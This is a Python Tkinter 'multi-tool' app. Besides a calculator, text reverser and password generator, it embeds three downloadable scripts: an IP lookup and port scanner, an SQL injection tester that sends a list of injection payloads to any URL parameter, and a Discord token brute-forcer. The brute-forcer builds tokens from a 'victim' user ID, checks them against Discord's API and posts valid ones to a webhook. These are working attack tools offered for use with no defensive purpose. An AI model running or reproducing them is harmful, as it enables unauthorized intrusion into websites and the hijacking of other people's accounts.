import tkinter as tk
from tkinter import ttk, filedialog
import time
import random
import string

class MultiToolApp:
    def __init__(self, root):
        self.root = root
        self.root.title(".L Society Multi-Tool")
        self.root.geometry("600x400")
        self.root.configure(bg="#FF0000")  # Red background

        # Configure button style
        style = ttk.Style()
        style.configure(
            "Custom.TButton",
            font=("Arial", 12, "bold"),
            padding=10,
            background="#333333",
            foreground="#FFFFFF"
        )
        style.map(
            "Custom.TButton",
            background=[("active", "#555555")],  # Lighter gray on hover
            foreground=[("active", "#FFFFFF")]
        )

        # ASCII art for loading screen
        self.ascii_art = """
 ██▓         ██████  ▒█████   ▄████▄   ██▓▓█████▄▄▄█████▓▓██   ██▓
▓██▒       ▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒▓█   ▀▓  ██▒ ▓▒ ▒██  ██▒
▒██░       ░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒▒███  ▒ ▓██░ ▒░  ▒██ ██░
▒██░         ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░▒▓█  ▄░ ▓██▓ ░   ░ ▐██▓░
░██████▒   ▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░░▒████▒ ▒██▒ ░   ░ ██▒▓░
░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓  ░░ ▒░ ░ ▒ ░░      ██▒▒▒ 
░ ░ ▒  ░   ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░ ░ ░  ░   ░     ▓██ ░▒░ 
  ░ ░      ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░   ░    ░       ▒ ▒ ░░  
    ░  ░         ░      ░ ░  ░ ░       ░     ░  ░         ░ ░     
                             ░                            ░ ░     
        """

        # Colors for cycling (kept original for loading screen)
        self.colors = ["#00ff00", "#ffffff", "#00ffff"]
        self.color_index = 0

        # geoip[1].py content
        self.geoip_script = """import os
import subprocess
import socket
import concurrent.futures
import platform
import requests

menu = \"\"\"
      ██▓ ██▓███      ██▓     ▒█████   ▒█████   ██ ▄█▀ █    ██  ██▓███
      ▓██▒▓██░  ██▒   ▓██▒    ▒██▒  ██▒▒██▒  ██▒ ██▄█▒  ██  ▓██▒▓██░  ██▒
      ▒██▒▓██░ ██▓▒   ▒██░    ▒██░  ██▒▒██░  ██▒▓███▄░ ▓██  ▒██░▓██░ ██▓▒
      ░██░▒██▄█▓▒ ▒   ▒██░    ▒██   ██░▒██   ██░▓██ █▄ ▓▓█  ░██░▒██▄█▓▒ ▒
      ░██░▒██▒ ░  ░   ░██████▒░ ████▓▒░░ ████▓▒░▒██▒ █▄▒▒█████▓ ▒██▒ ░  ░
      ░▓  ▒▓▒░ ░  ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
      ▒ ░░▒ ░        ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░░░▒░ ░ ░ ░▒ ░
      ▒ ░░░            ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░  ░░░ ░ ░ ░░
      ░                  ░  ░    ░ ░      ░ ░  ░  ░      ░
\"\"\"
menu2 = \"\"\"
[0] Back to main
[1] IP Info
[2] IP Ping
[3] Port Scan
[4] Reverse DNS
\"\"\"

def ip_info(ip_address):
    response = requests.get(f'http://ip-api.com/json/{ip_address}')
    
    if response.status_code == 200:
        data = response.json()
        
        if data['status'] == 'success':
            pays = data.get('country', 'N/A')
            ville = data.get('city', 'N/A')
            region = data.get('regionName', 'N/A')
            zip_code = data.get('zip', 'N/A')
            isp = data.get('isp', 'N/A')
            fuseau = data.get('timezone', 'N/A')
            lat = data.get('lat', 0)
            lon = data.get('lon', 0)
            maps_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
            
            result = {
                "IP": ip_address,
                "Pays": pays,
                "Ville": ville,
                "Région": region,
                "ZIP": zip_code,
                "ISP": isp,
                "Fuseau horaire": fuseau,
                "Latitude": lat,
                "Longitude": lon,
                "Google Maps": maps_url
            }
            
            for key, value in result.items():
                print(f"\\033[31m{key} : {value}\\033[0m")
        else:
            print("\\033[31mVeuillez vérifier l'adresse IP et réessayer.\\033[0m")
    else:
        print("\\033[31mVeuillez réessayer plus tard **(API)**.\\033[0m")
        
def ping_ip(ip_address):
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    
    try:
        result = subprocess.run(['ping', param, '4', ip_address], capture_output=True, text=True, timeout=10)
        print(f"\\033[31m\\n{'=' * 60}\\nPINGING {ip_address}\\n{'=' * 60}\\033[0m")
        print(f"\\033[31m{result.stdout}\\033[0m")
        
    except subprocess.TimeoutExpired:
        print("\\033[31mLe ping a expiré (Timeout).\\033[0m")
    except Exception as e:
        print(f"\\033[31mUne erreur est survenue : {e}\\033[0m")
        
def scan_port(ip_address, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip_address, port))
        sock.close()
        return port if result == 0 else None
    except Exception:
        return None
        
def port_scan(ip_address):
    open_ports = []
    print(f"\\033[31mScanning ports on {ip_address}... This may take a while.\\033[0m")
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, ip_address, port): port for port in range(1, 1025)}
        for future in concurrent.futures.as_completed(futures):
            port = futures[future]
            if future.result():
                open_ports.append(port)
                print(f"\\033[31mPort {port} is open\\033[0m")

    if open_ports:
        print(f"\\n\\033[31m{'=' * 60}\\nOPEN PORTS ON {ip_address}\\n{'=' * 60}\\033[0m")
        print(f"\\033[31mPorts Ouverts: {open_ports}\\033[0m")
    else:
        print(f"\\033[31mAucun port ouvert trouvé sur {ip_address}.\\033[0m")

def reverse_dns(ip_address):
    try:
        result = subprocess.run(['nslookup', ip_address], capture_output=True, text=True)
        print(f"\\033[31m\\n{'=' * 60}\\nREVERSE DNS LOOKUP {ip_address}\\n{'=' * 60}\\033[0m")
        print(f"\\033[31m{result.stdout}\\033[0m")
    except FileNotFoundError:
        print("\\033[31mLa commande 'nslookup' n'a pas été trouvée.\\033[0m")
    except Exception as e:
        print(f"\\033[31mUne erreur est survenue : {e}\\033[0m")

def show_menu():
    print(f"\\033[31m{menu}\\033[0m")
    print(f"\\033[31m{menu2}\\033[0m")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input("\\033[31mChoice >> \\033[0m"))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                ip_address = input("\\033[31mAdresse IP >> \\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\\033[31m{menu}\\033[0m")
                ip_info(ip_address)
            elif choice == 2:
                ip_address = input("\\033[31mAdresse IP >> \\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\\033[31m{menu}\\033[0m")
                ping_ip(ip_address)
            elif choice == 3:
                ip_address = input("\\033[31mAdresse IP >> \\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\\033[31m{menu}\\033[0m")
                port_scan(ip_address)
            elif choice == 4:
                ip_address = input("\\033[31mAdresse IP >> \\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\\033[31m{menu}\\033[0m")
                reverse_dns(ip_address)
            else:
                print("\\033[31m[!]\\033[0m Invalid choice \\033[31m[!]\\033[0m")
        except ValueError:
            print("\\033[31mPlease enter a valid number\\033[0m")
        input("\\n\\033[31mPress Enter to return to the menu...\\033[0m")

if __name__ == "__main__":
    main()
"""

        # sql_vulnerability[1].py content
        self.sql_vulnerability_script = """import requests
import os
import time

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1 sns=1 #",
    "' OR 1=1 /*",
    "' AND 1=CONVERT(int, @@version) --",
    "' AND 1=CONVERT(int, @@version) /*",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL, NULL --",
    "' UNION SELECT NULL, user(), NULL --",
    "' UNION SELECT NULL, @@version --",
    "' UNION SELECT 1, 'text', 3 --",
    "' UNION ALL SELECT NULL, NULL, NULL, NULL --",
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') --",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "' OR 1=1/*",
    "' OR 1=1--",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' AND 1=1/*",
    "' AND 1=2/*",
    "' AND 1=1--",
    "' AND 1=1'",
    "' AND 1=2",
    "' AND 1=2--",
    "' AND 1=2/*",
    "' AND 1=2#",
    "' AND 1=2--",
    "' AND 1=2 /*",
    "' AND 1=2 #",
    "' AND 1=2 --",
]

def sql_vulnerability(url, param):
    vulnerable = False
    for payload in payloads:
        test_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(test_url, timeout=10)
            if "error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower():
                print(f"\\033[31mPossible SQL Injection vulnerability detected with payload: {payload}\\033[0m")
                print(f"\\033[31mVulnerable URL: {test_url}\\033[0m")
                vulnerable = True
        except requests.RequestException as e:
            print(f"Request failed: {e}")
    
    if not vulnerable:
        print("\\033[31mNo SQL Injection vulnerabilities detected.\\033[0m")

menu = \"\"\"
          ██████   █████   ██▓
         ▒██    ▒ ▒██▓  ██▒▓██▒
         ░ ▓██▄   ▒██▒  ██░▒██░
           ▒   ██▒░██  █▀ ░▒██░
         ▒██████▒▒░▒███▒█▄ ░██████▒
         ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░
         ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░
         ░  ░  ░     ░   ░   ░ ░
              ░      ░        ░  ░

\"\"\"
menu2 = \"\"\"
[0] Back to main
[1] SQL Vulnerability Scanner
\"\"\"
def show_menu():
    print(f"\\033[31m{menu}\\033[0m")
    print(f"\\033[31m{menu2}\\033[0m")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\\033[31mChoice >> \\033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                url = input('\\033[31mEnter the URL to test (e.g., http://example.com/profile.php): \\033[0m').strip()
                param = input('\\033[31mEnter the URL parameter to test (e.g., id): \\033[0m').strip()
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\\033[31m{menu}\\033[0m")
                print(f"\\33[31mRecherche en cours..\\33[0m")
                time.sleep(2)
                
                sql_vulnerability(url, param)
                input("\\n\\033[31mPress Enter to return to the menu...\\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                show_menu()
            else:
                print("\\033[31m[!]\\033[0m Invalid choice \\033[31m[!]\\033[0m")
                input("\\n\\033[31mPress Enter to return to the menu...\\033[0m")
                os.system('cls' if os.name == 'nt' else 'clear')
                show_menu()
        except ValueError:
            print("\\033[31mPlease enter a valid number\\033[0m")
            input("\\n\\033[31mPress Enter to the menu...\\033[0m")
            os.system('cls' if os.name == 'nt' else 'clear')
            show_menu()

if __name__ == "__main__":
    main()
"""

        # discord_token_bruteforce[1].py content
        self.discord_token_script = """import os
import base64
import random
import string
import requests
import json
import threading

menu = \"\"\"
          ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████   █████▒▒█████   ██▀███   ▄████▄  ▓█████
         ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀
         ▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███
         ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄
         ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
         ░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
         ▒░▒   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
          ░    ░   ░░   ░  ░░░ ░ ░   ░         ░    ░ ░   ░ ░ ░ ▒    ░e   ░ ░           ░
          ░         ░        ░                 ░  ░           ░ ░     ░     ░ ░         ░  ░
               ░                                                            ░
\"\"\"
menu2 = \"\"\"
[0] Back to main
[1] Brute Force Token
\"\"\"

def show_menu():
    print(f"\\033[31m{menu}")
    print(f"\\033[31m{menu2}\\033[0m")

def brute_force():
    try:
        userid = input(f"\\033[31mVictime ID >> \\033[0m")
        OnePartToken = str(base64.b64encode(userid.encode("utf-8")), "utf-8")
        motifs = ["=", "==", "==="]
        for motif in motifs:
            if OnePartToken.endswith(motif):
                OnePartToken = OnePartToken[:-len(motif)]
        print(f'\\033[31mPart One Token: {OnePartToken}\\033[0m')

        brute = input(f"\\033[31mFind the second part by brute force? (y/n) >> \\033[0m")
        if brute.lower() not in ['y', 'yes']:
            return

        webhook = input(f"\\033[31mWebhook? (y/n) >> \\033[0m")
        if webhook.lower() in ['y', 'yes']:
            webhook_url = input(f"\\033[31mWebhook URL >> \\033[0m")
            print(f"\\033[31mChecking Webhook: {webhook_url}\\033[0m")

        try:
            threads_number = int(input(f"\\033[31mThreads Number >> \\033[0m"))
        except:
            print(f"\\033[31mInvalid number\\033[0m")
            return

        def send_webhook(embed_content):
            payload = {
                'embeds': [embed_content],
                'username': 'WebhookUsername',
                'avatar_url': 'WebhookAvatarURL'
            }
            headers = {'Content-Type': 'application/json'}
            requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        def token_check():
            first = OnePartToken
            second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
            third = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
            token = f"{first}.{second}.{third}"

            try:
                response = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
                if response.status_code == 200:
                    if webhook.lower() == 'y':
                        embed_content = {
                            'title': f'Token Valid !',
                            'description': f"**Token:**\\n```{token}```",
                            'color': 0x00FF00,
                            'footer': {"text": 'WebhookUsername', "icon_url": 'WebhookAvatarURL'}
                        }
                        send_webhook(embed_content)
                        print(f"\\033[32mStatus: Valid Token: {token}\\033[0m")
                    else:
                        print(f"\\033[32mStatus: Valid Token: {token}\\033[0m")
                else:
                    print(f"\\033[31mStatus: Invalid Token: {token}\\033[0m")
            except:
                print(f"\\033[31mStatus: Error Token: {token}\\033[0m")

        def request():
            threads = []
            try:
                for _ in range(threads_number):
                    t = threading.Thread(target=token_check)
                    t.start()
                    threads.append(t)
            except:
                print(f"\\033[31mInvalid number\\033[0m")
                return

            for thread in threads:
                thread.join()

        while True:
            request()
    except Exception as e:
        print(f"\\033[31m[Error] {e}\\033[0m")

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        show_menu()
        try:
            choice = int(input('\\033[31mChoice >> \\033[0m'))
            if choice == 0:
                os.system('python cyb3rtech.py')
                break
            elif choice == 1:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"\\033[31m{menu}\\033[0m")
                brute_force()
            else:
                print("\\033[31m[!]\\033[0m Invalid choice \\033[31m[!]\\033[0m")
        except ValueError:
            print("\\033[31mPlease enter a valid number\\033[0m")
        input("\\n\\033[31mPress Enter to return to the menu...\\033[0m")

if __name__ == "__main__":
    main()
"""

        # Start with loading screen
        self.show_loading_screen()

    def show_loading_screen(self):
        # Create loading screen frame
        self.loading_frame = tk.Frame(self.root, bg="#FF0000")  # Red background
        self.loading_frame.pack(fill="both", expand=True)

        # ASCII art label
        self.loading_label = tk.Label(
            self.loading_frame,
            text=self.ascii_art,
            font=("Courier", 8),
            fg=self.colors[self.color_index],
            bg="#FF0000",  # Red background
            justify="left"
        )
        self.loading_label.pack(pady=20)

        # Progress bar
        self.progress = ttk.Progressbar(
            self.loading_frame,
            orient="horizontal",
            length=300,
            mode="determinate"
        )
        self.progress.pack(pady=10)

        # Start color cycling and progress animation
        self.progress_value = 0
        self.update_loading_screen()

    def update_loading_screen(self):
        if self.progress_value < 100:
            self.progress_value += 2
            self.progress["value"] = self.progress_value

            # Cycle colors
            self.color_index = (self.color_index + 1) % len(self.colors)
            self.loading_label.config(fg=self.colors[self.color_index])

            # Update every 100ms
            self.root.after(100, self.update_loading_screen)
        else:
            # Destroy loading screen and show main menu
            self.loading_frame.destroy()
            self.show_main_menu()

    def show_main_menu(self):
        # Main frame
        self.main_frame = tk.Frame(self.root, bg="#FF0000")  # Red background
        self.main_frame.pack(fill="both", expand=True)

        # Title
        tk.Label(
            self.main_frame,
            text=".L Society Multi-Tool",
            font=("Arial", 16, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        # Tool buttons
        ttk.Button(
            self.main_frame,
            text="Calculator",
            command=self.show_calculator,
            style="Custom.TButton",
            width=30
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Text Reverser",
            command=self.show_text_reverser,
            style="Custom.TButton",
            width=30
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Password Generator",
            command=self.show_password_generator,
            style="Custom.TButton",
            width=30
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Download GeoIP Script",
            command=self.show_geoip_downloader,
            style="Custom.TButton",
            width=30
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Download SQL Vulnerability Scanner",
            command=self.show_sql_vulnerability_downloader,
            style="Custom.TButton",
            width=30
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Download Discord Token BruteForce",
            command=self.show_discord_token_downloader,
            style="Custom.TButton",
            width=30
        ).pack(pady=5)

    def clear_main_frame(self):
        for widget in self.main_frame.winfo_children():
            widget.destroy()

    def show_calculator(self):
        self.clear_main_frame()
        tk.Label(
            self.main_frame,
            text="Calculator",
            font=("Arial", 14, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        # Input fields
        tk.Label(self.main_frame, text="Number 1:", fg="#FFFFFF", bg="#FF0000").pack()
        num1_entry = tk.Entry(self.main_frame, fg="#FFFFFF", bg="#333333")  # Dark entry background
        num1_entry.pack()
        tk.Label(self.main_frame, text="Number 2:", fg="#FFFFFF", bg="#FF0000").pack()
        num2_entry = tk.Entry(self.main_frame, fg="#FFFFFF", bg="#333333")
        num2_entry.pack()

        # Operation selection
        operation = tk.StringVar(value="+")
        tk.Radiobutton(self.main_frame, text="+", variable=operation, value="+", bg="#FF0000", fg="#FFFFFF").pack()
        tk.Radiobutton(self.main_frame, text="-", variable=operation, value="-", bg="#FF0000", fg="#FFFFFF").pack()
        tk.Radiobutton(self.main_frame, text="*", variable=operation, value="*", bg="#FF0000", fg="#FFFFFF").pack()
        tk.Radiobutton(self.main_frame, text="/", variable=operation, value="/", bg="#FF0000", fg="#FFFFFF").pack()

        result_label = tk.Label(self.main_frame, text="Result: ", fg="#FFFFFF", bg="#FF0000")
        result_label.pack(pady=10)

        def calculate():
            try:
                num1 = float(num1_entry.get())
                num2 = float(num2_entry.get())
                op = operation.get()
                if op == "+":
                    result = num1 + num2
                elif op == "-":
                    result = num1 - num2
                elif op == "*":
                    result = num1 * num2
                elif op == "/":
                    result = num1 / num2 if num2 != 0 else "Error: Divide by zero"
                result_label.config(text=f"Result: {result}")
            except ValueError:
                result_label.config(text="Error: Invalid input")

        ttk.Button(
            self.main_frame,
            text="Calculate",
            command=calculate,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Back",
            command=self.show_main_menu,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)

    def show_text_reverser(self):
        self.clear_main_frame()
        tk.Label(
            self.main_frame,
            text="Text Reverser",
            font=("Arial", 14, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        tk.Label(self.main_frame, text="Enter text:", fg="#FFFFFF", bg="#FF0000").pack()
        text_entry = tk.Entry(self.main_frame, width=50, fg="#FFFFFF", bg="#333333")
        text_entry.pack()

        result_label = tk.Label(self.main_frame, text="Reversed: ", fg="#FFFFFF", bg="#FF0000")
        result_label.pack(pady=10)

        def reverse_text():
            text = text_entry.get()
            result_label.config(text=f"Reversed: {text[::-1]}")

        ttk.Button(
            self.main_frame,
            text="Reverse",
            command=reverse_text,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Back",
            command=self.show_main_menu,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)

    def show_password_generator(self):
        self.clear_main_frame()
        tk.Label(
            self.main_frame,
            text="Password Generator",
            font=("Arial", 14, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        tk.Label(self.main_frame, text="Password length:", fg="#FFFFFF", bg="#FF0000").pack()
        length_entry = tk.Entry(self.main_frame, fg="#FFFFFF", bg="#333333")
        length_entry.insert(0, "12")
        length_entry.pack()

        result_label = tk.Label(self.main_frame, text="Generated Password: ", fg="#FFFFFF", bg="#FF0000")
        result_label.pack(pady=10)

        def generate_password():
            try:
                length = int(length_entry.get())
                if length < 1:
                    result_label.config(text="Error: Length must be positive")
                    return
                characters = string.ascii_letters + string.digits + string.punctuation
                password = ''.join(random.choice(characters) for _ in range(length))
                result_label.config(text=f"Generated Password: {password}")
            except ValueError:
                result_label.config(text="Error: Invalid length")

        ttk.Button(
            self.main_frame,
            text="Generate",
            command=generate_password,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Back",
            command=self.show_main_menu,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)

    def show_geoip_downloader(self):
        self.clear_main_frame()
        tk.Label(
            self.main_frame,
            text="Download GeoIP Script",
            font=("Arial", 14, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        result_label = tk.Label(self.main_frame, text="Click to download geoip.py", fg="#FFFFFF", bg="#FF0000")
        result_label.pack(pady=10)

        def download_geoip():
            file_path = filedialog.asksaveasfilename(
                defaultextension=".py",
                filetypes=[("Python files", "*.py"), ("All files", "*.*")],
                initialfile="geoip.py"
            )
            if file_path:
                try:
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(self.geoip_script)
                    result_label.config(text=f"File saved to {file_path}")
                except Exception as e:
                    result_label.config(text=f"Error: Failed to save file - {str(e)}")

        ttk.Button(
            self.main_frame,
            text="Download File",
            command=download_geoip,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Back",
            command=self.show_main_menu,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)

    def show_sql_vulnerability_downloader(self):
        self.clear_main_frame()
        tk.Label(
            self.main_frame,
            text="Download SQL Vulnerability Scanner",
            font=("Arial", 14, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        result_label = tk.Label(self.main_frame, text="Click to download sql_vulnerability.py", fg="#FFFFFF", bg="#FF0000")
        result_label.pack(pady=10)

        def download_sql_vulnerability():
            file_path = filedialog.asksaveasfilename(
                defaultextension=".py",
                filetypes=[("Python files", "*.py"), ("All files", "*.*")],
                initialfile="sql_vulnerability.py"
            )
            if file_path:
                try:
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(self.sql_vulnerability_script)
                    result_label.config(text=f"File saved to {file_path}")
                except Exception as e:
                    result_label.config(text=f"Error: Failed to save file - {str(e)}")

        ttk.Button(
            self.main_frame,
            text="Download File",
            command=download_sql_vulnerability,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Back",
            command=self.show_main_menu,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)

    def show_discord_token_downloader(self):
        self.clear_main_frame()
        tk.Label(
            self.main_frame,
            text="Download Discord Token BruteForce",
            font=("Arial", 14, "bold"),
            fg="#FFFFFF",  # White for contrast
            bg="#FF0000"  # Red background
        ).pack(pady=10)

        result_label = tk.Label(self.main_frame, text="Click to download discord_token_bruteforce.py", fg="#FFFFFF", bg="#FF0000")
        result_label.pack(pady=10)

        def download_discord_token():
            file_path = filedialog.asksaveasfilename(
                defaultextension=".py",
                filetypes=[("Python files", "*.py"), ("All files", "*.*")],
                initialfile="discord_token_bruteforce.py"
            )
            if file_path:
                try:
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(self.discord_token_script)
                    result_label.config(text=f"File saved to {file_path}")
                except Exception as e:
                    result_label.config(text=f"Error: Failed to save file - {str(e)}")

        ttk.Button(
            self.main_frame,
            text="Download File",
            command=download_discord_token,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)
        ttk.Button(
            self.main_frame,
            text="Back",
            command=self.show_main_menu,
            style="Custom.TButton",
            width=20
        ).pack(pady=5)

if __name__ == "__main__":
    root = tk.Tk()
    app = MultiToolApp(root)
    root.mainloop()